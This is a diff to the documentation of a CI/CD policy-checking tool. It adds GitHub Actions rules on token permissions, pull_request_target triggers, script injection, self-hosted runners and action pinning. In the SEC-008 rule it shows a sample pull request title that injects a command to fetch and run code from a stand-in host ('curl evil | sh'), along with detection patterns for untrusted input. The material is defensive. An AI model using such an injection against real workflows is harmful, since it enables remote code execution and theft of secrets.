@@ -12,7 +12,7 @@ Standards are configuration, not code: in `config/policy.yaml` any rule can be d
 (`rules: {ID: {enabled, severity, params}}`), and the weights can be changed (`scoring:`). The "Tunable params"
 line of a rule lists its knobs with their defaults. See [STANDARDS.md](STANDARDS.md) for where every standard lives.
 
-**56 rules** in 8 categories.
+**61 rules** in 8 categories.
 
 | Rule | Severity | Scope | Title |
 |---|---|---|---|
@@ -38,6 +38,10 @@ line of a rule lists its knobs with their defaults. See [STANDARDS.md](STANDARDS
 | [SEC-003](#sec-003) | high | pipeline | Service connections use workload identity federation |
 | [SEC-004](#sec-004) | medium | pipeline | Service connections are not authorized for all pipelines |
 | [SEC-005](#sec-005) | medium | pipeline | Production service connections are scoped (resource group preferred) |
+| [SEC-006](#sec-006) | high | pipeline | Workflow token permissions follow least privilege |
+| [SEC-007](#sec-007) | critical | pipeline | pull_request_target / workflow_run workflows do not run untrusted code |
+| [SEC-008](#sec-008) | high | pipeline | No script injection through untrusted event data |
+| [SEC-009](#sec-009) | medium | pipeline | Self-hosted runners are not used by workflows that outsiders can trigger |
 | [SRC-001](#src-001) | high | repo | Default branch requires 2+ reviewers (creator vote excluded, reset on push) |
 | [SRC-002](#src-002) | high | repo | Default branch has a build validation policy |
 | [SRC-003](#src-003) | medium | repo | Linked work item and resolved comments required |
@@ -52,6 +56,7 @@ line of a rule lists its knobs with their defaults. See [STANDARDS.md](STANDARDS
 | [SUP-003](#sup-003) | medium | pipeline | Marketplace tasks are on the allowlist |
 | [SUP-004](#sup-004) | high | pipeline | AKS images come from an approved ACR and are never :latest |
 | [SUP-005](#sup-005) | low | pipeline | An SBOM is generated |
+| [SUP-006](#sup-006) | medium | pipeline | Actions are pinned to a full commit SHA |
 | [TGT-ADF-001](#tgt-adf-001) | high | stage | ADF CI uses the npm utilities (not the manual adf_publish branch) |
 | [TGT-ADF-002](#tgt-adf-002) | high | stage | ADF deploy stops and restarts triggers (pre/post deployment script) |
 | [TGT-ADF-003](#tgt-adf-003) | medium | stage | ADF linked services and global parameters are overridden per environment |
@@ -133,6 +138,7 @@ line of a rule lists its knobs with their defaults. See [STANDARDS.md](STANDARDS
 - Remediation:
   - Classic pipelines: Release definition > Artifact > Continuous deployment trigger > Build branch filters: include only main/release/*.
   - YAML pipelines: Add a 'Branch control' check on the production environment allowing only refs/heads/main and release/*.
+  - GitHub Actions: Environment > Deployment branches and tags: 'Protected branches only' or selected branches (main, release/*).
 
 ### SRC-006
 
@@ -336,6 +342,7 @@ line of a rule lists its knobs with their defaults. See [STANDARDS.md](STANDARDS
 - Remediation:
   - Classic pipelines: Add a post-deployment gate (Invoke REST API / Azure Monitor) or a smoke-test task after the deploy.
   - YAML pipelines: Add a smoke test step (curl /health) or an environment check after deployment.
+  - GitHub Actions: Add a smoke-test step (curl --fail /health) to the deploy job, or a job that `needs` it.
 
 ### TST-006
 
@@ -362,6 +369,7 @@ line of a rule lists its knobs with their defaults. See [STANDARDS.md](STANDARDS
 - Remediation:
   - Classic pipelines: Link the release to a single build artifact and remove build/publish tasks from release stages.
   - YAML pipelines: Build and publish an artifact in the build stage; deployment stages must only download and deploy it.
+  - GitHub Actions: Build once in a CI job, upload the artifact (or push the image and pass its digest) and let the environment deploy jobs only download it.
 
 ### SUP-002
 
@@ -375,6 +383,7 @@ line of a rule lists its knobs with their defaults. See [STANDARDS.md](STANDARDS
 - Remediation:
   - Classic pipelines: Pin each task to a major version (e.g. 2.*) and upgrade deprecated tasks.
   - YAML pipelines: Use Task@<major> and replace deprecated tasks (see data/deprecated_tasks.yaml).
+  - GitHub Actions: Pin `uses:` to a version tag or commit SHA (never a branch) and upgrade actions listed in deprecated_tasks.yaml (deprecated_actions).
 
 ### SUP-003
 
@@ -383,9 +392,11 @@ line of a rule lists its knobs with their defaults. See [STANDARDS.md](STANDARDS
 - Severity: **medium**
 - Evaluated per: **pipeline**
 - Applies to: all
+- Tunable params (`policy.yaml` `rules.SUP-003.params`): `trusted_action_owners` = `['actions', 'github']`
 - Why it matters: Third-party tasks run with the pipeline's credentials; only reviewed extensions should be used.
 - Remediation:
   - All platforms: Replace the task, or have the extension reviewed and add it to marketplace_task_allowlist in config/policy.yaml.
+  - GitHub Actions: Replace the action, or have it reviewed and add its owner to the rule's trusted_action_owners (or `owner/*` / `owner/repo` to marketplace_task_allowlist).
 
 ### SUP-004
 
@@ -410,6 +421,18 @@ line of a rule lists its knobs with their defaults. See [STANDARDS.md](STANDARDS
 - Remediation:
   - Classic pipelines: Add the SBOM Generator task or a syft/cyclonedx step.
   - YAML pipelines: Add sbom-tool / ManifestGenerator, or 'syft packages' to the build.
+
+### SUP-006
+
+**Actions are pinned to a full commit SHA**
+
+- Severity: **medium**
+- Evaluated per: **pipeline**
+- Applies to: platforms: gha
+- Tunable params (`policy.yaml` `rules.SUP-006.params`): `trusted_owners` = `[]`
+- Why it matters: A tag or branch can be moved by whoever controls the action's repository (or someone who compromises it); a full commit SHA cannot. Local actions (./path) are exempt; owners listed in `trusted_owners` may use version tags (never branches).
+- Remediation:
+  - GitHub Actions: Replace `uses: owner/action@v4` with `uses: owner/action@<40-character commit SHA> # v4.x.y` (Dependabot or Renovate can keep the SHAs current).
 
 
 ## SEC: Secrets and identity
@@ -448,6 +471,7 @@ line of a rule lists its knobs with their defaults. See [STANDARDS.md](STANDARDS
 - Why it matters: Service principal secrets expire, leak and are rarely rotated; federation removes the secret entirely.
 - Remediation:
   - All platforms: Convert the Azure Resource Manager service connection to 'Workload identity federation' (Convert action in Service connections).
+  - GitHub Actions: Use azure/login with client-id, tenant-id and subscription-id plus `permissions: id-token: write` (a federated credential), and remove creds / client-secret inputs and long-lived secrets.
 
 ### SEC-004
 
@@ -472,6 +496,52 @@ line of a rule lists its knobs with their defaults. See [STANDARDS.md](STANDARDS
 - Remediation:
   - All platforms: Recreate the production service connection scoped to the target resource group.
 
+### SEC-006
+
+**Workflow token permissions follow least privilege**
+
+- Severity: **high**
+- Evaluated per: **pipeline**
+- Applies to: platforms: gha
+- Tunable params (`policy.yaml` `rules.SEC-006.params`): `job_write_scopes` = `['id-token', 'packages', 'security-events', 'deployments', 'attestations', 'pull-requests', 'checks', 'statuses', 'pages']`
+- Why it matters: GITHUB_TOKEN permissions default to the repository setting (often read-write). A declared top-level `permissions:` block with read-only defaults and write scopes only on the jobs that need them limits what a compromised step or action can do.
+- Remediation:
+  - GitHub Actions: Add a top-level `permissions: contents: read` and grant write scopes (id-token, packages, ...) only on the job that needs them; never use write-all.
+
+### SEC-007
+
+**pull_request_target / workflow_run workflows do not run untrusted code**
+
+- Severity: **critical**
+- Evaluated per: **pipeline**
+- Applies to: platforms: gha
+- Why it matters: These triggers run with a write token and the repository's secrets. Checking out the pull request head (or a fork's workflow run) and building or running it hands an outsider those secrets.
+- Remediation:
+  - GitHub Actions: Do not check out `github.event.pull_request.head.*` / `workflow_run.head_*` in these workflows; split the untrusted build into a plain `pull_request` workflow and pass only data (reviewed, not executed) to the privileged one.
+
+### SEC-008
+
+**No script injection through untrusted event data**
+
+- Severity: **high**
+- Evaluated per: **pipeline**
+- Applies to: platforms: gha
+- Tunable params (`policy.yaml` `rules.SEC-008.params`): `untrusted_contexts` = `['github\\.event\\.(issue|pull_request|discussion)\\.(title|body)', 'github\\.event\\.(comment|review|review_comment)\\.body', 'github\\.event\\.pull_request\\.head\\.(ref|label|repo\\.default_branch)', 'github\\.event\\.(head_commit|commits\\.[^.}\\s]+)\\.(message|author\\.(name|email))', 'github\\.event\\.pages\\.[^.}\\s]+\\.page_name', 'github\\.event\\.workflow_run\\.(head_branch|head_commit\\.(message|author\\.(name|email))|head_repository\\.description|pull_requests\\.[^.}\\s]+\\.head\\.ref)', 'github\\.head_ref']`
+- Why it matters: `${{ github.event.pull_request.title }}` inside `run:` is substituted into the shell script before it runs: a title like `"; curl evil | sh #` executes. Pass untrusted values through an environment variable instead.
+- Remediation:
+  - GitHub Actions: Move the expression to `env:` (e.g. `env: TITLE: ${{ github.event.pull_request.title }}`) and use `"$TITLE"` in the script.
+
+### SEC-009
+
+**Self-hosted runners are not used by workflows that outsiders can trigger**
+
+- Severity: **medium**
+- Evaluated per: **pipeline**
+- Applies to: platforms: gha
+- Why it matters: A pull request, issue or comment event can start a workflow; on a self-hosted runner that code runs inside your network and may persist between jobs. Always a warning (the repository may be private and fork pull requests disabled).
+- Remediation:
+  - GitHub Actions: Use GitHub-hosted (or ephemeral, isolated) runners for workflows triggered by pull_request, issue_comment and similar events, or require approval for outside collaborators.
+
 
 ## DEP: Deployment governance
 
@@ -486,6 +556,7 @@ line of a rule lists its knobs with their defaults. See [STANDARDS.md](STANDARDS
 - Remediation:
   - Classic pipelines: Release definition > Production stage > Pre-deployment conditions > enable Pre-deployment approvals with named approvers.
   - YAML pipelines: Environment > Approvals and checks > add an Approval check on the production environment.
+  - GitHub Actions: Repository Settings > Environments > production > enable 'Required reviewers' (a team), and reference the environment from the deploy job.
 
 ### DEP-002
 
@@ -498,6 +569,7 @@ line of a rule lists its knobs with their defaults. See [STANDARDS.md](STANDARDS
 - Remediation:
   - Classic pipelines: Pre-deployment approvals > untick 'The user requesting a release can approve it'.
   - YAML pipelines: Approval check > tick 'Requester cannot approve their own deployments'.
+  - GitHub Actions: Environment > Required reviewers > tick 'Prevent self-review'.
 
 ### DEP-003
 
@@ -506,10 +578,12 @@ line of a rule lists its knobs with their defaults. See [STANDARDS.md](STANDARDS
 - Severity: **critical**
 - Evaluated per: **stage**
 - Applies to: environment tiers: prod
+- Tunable params (`policy.yaml` `rules.DEP-003.params`): `servicenow_app_pattern` = `'(?i)servicenow|snow'`
 - Why it matters: Production changes must be backed by an approved ServiceNow CRQ.
 - Remediation:
   - Classic pipelines: Add a ServiceNow Change Management gate to the pre-deployment gates of the production stage.
   - YAML pipelines: Add a ServiceNow check to the production environment, or a ServiceNow-DevOps task before deployment.
+  - GitHub Actions: Install the ServiceNow DevOps GitHub App as a custom deployment protection rule on the production environment, or call ServiceNow/servicenow-devops-change before the deploy job.
 
 ### DEP-004
 
@@ -523,6 +597,7 @@ line of a rule lists its knobs with their defaults. See [STANDARDS.md](STANDARDS
 - Remediation:
   - Classic pipelines: Production stage > Pre-deployment conditions > trigger 'After stage' = UAT (not 'After release').
   - YAML pipelines: Set dependsOn on the production stage to the UAT/test stage.
+  - GitHub Actions: Add `needs: <test/uat deploy job>` to the production job (or trigger the production workflow with workflow_run from the lower-environment workflow).
 
 ### DEP-005
 
@@ -617,6 +692,7 @@ line of a rule lists its knobs with their defaults. See [STANDARDS.md](STANDARDS
 - Remediation:
   - Classic pipelines: Deploy to the 'staging' slot (Deploy to Slot) then add an App Service Manage task with Action=Swap Slots.
   - YAML pipelines: Set deployToSlotOrASE: true / slotName: staging on the deploy task, then AzureAppServiceManage@0 Action: Swap Slots.
+  - GitHub Actions: Set `slot-name: staging` on azure/webapps-deploy (or Azure/functions-action), then `az webapp deployment slot swap` in a following step.
 
 ### TGT-FA-002
 
@@ -695,6 +771,7 @@ line of a rule lists its knobs with their defaults. See [STANDARDS.md](STANDARDS
 - Remediation:
   - Classic pipelines: Deploy to the 'staging' slot (Deploy to Slot) then add an App Service Manage task with Action=Swap Slots.
   - YAML pipelines: Set deployToSlotOrASE: true / slotName: staging on the deploy task, then AzureAppServiceManage@0 Action: Swap Slots.
+  - GitHub Actions: Set `slot-name: staging` on azure/webapps-deploy (or Azure/functions-action), then `az webapp deployment slot swap` in a following step.
 
 ### TGT-WA-002
 
